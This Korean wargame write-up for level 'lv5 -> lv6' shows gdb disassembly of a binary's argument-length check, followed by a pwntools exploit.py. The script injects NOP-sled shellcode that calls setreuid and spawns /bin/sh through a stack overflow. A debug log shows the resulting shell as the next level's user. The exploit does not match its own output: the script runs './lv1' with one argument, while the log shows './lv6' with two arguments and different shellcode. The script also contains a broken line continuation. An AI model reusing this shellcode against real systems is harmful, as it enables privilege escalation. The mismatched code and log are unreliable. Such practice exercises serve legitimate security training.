# Lv5 -> Lv6
## lv6
gdb를 이용해 lv6 바이너리의 주요 부분을 분석해 보면 다음과 같다.


* main + 176
```asm
   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485b3 <+179>:	add    eax,0x4
   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
   0x080485b8 <+184>:	push   edx
   0x080485b9 <+185>:	call   0x80483f0 <strlen@plt>    ; strlen(argv[1])
   0x080485be <+190>:	add    esp,0x4
   0x080485c1 <+193>:	mov    eax,eax
   0x080485c3 <+195>:	cmp    eax,0x30
   0x080485c6 <+198>:	jbe    0x80485e0 <main+224>      ; strlen(argv[1]) <= 0x30
   0x080485c8 <+200>:	push   0x8048699
   0x080485cd <+205>:	call   0x8048410 <printf@plt>
   0x080485d2 <+210>:	add    esp,0x4
   0x080485d5 <+213>:	push   0x0
   0x080485d7 <+215>:	call   0x8048420 <exit@plt>
   0x080485dc <+220>:	add    esp,0x4

```

argv[1]의 길이가 0x30을 넘지 않아야 한다. 앞 문제와 동일하게 argv[2]에 쉘코드를 넣어서 해결할 수 있다.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

argv = "\x90"*186 + "\x66\xb8\xe9\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" 
			+ "\x90"*36 + p32(0xffffd058)

p = process(['./lv1', argv])
if p.poll() == None:
    p.sendline('id')
    p.recv()
    p.sendline('my-pass')
    p.recv()
    p.interactive()
```
------

```
lv5@ubuntu:~$ python exploit.py 
[+] Starting local process './lv6' argv=['./lv6', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\xd3\xff\xff', '\x90\x90\x90\x90\x90 ... \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0\xb01\xcd\x80\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'] : pid 40549
[DEBUG] Received 0x31 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  61 61 61 61  90 d3 ff ff  │aaaa│aaaa│aaaa│····│
    00000030  0a                                                  │·│
    00000031
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x2d bytes:
    'uid=1006(lv6) gid=1005(lv5) groups=1005(lv5)\n'
[DEBUG] Sent 0x8 bytes:
    'my-pass\n'
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    'still easy\n'
still easy
$
```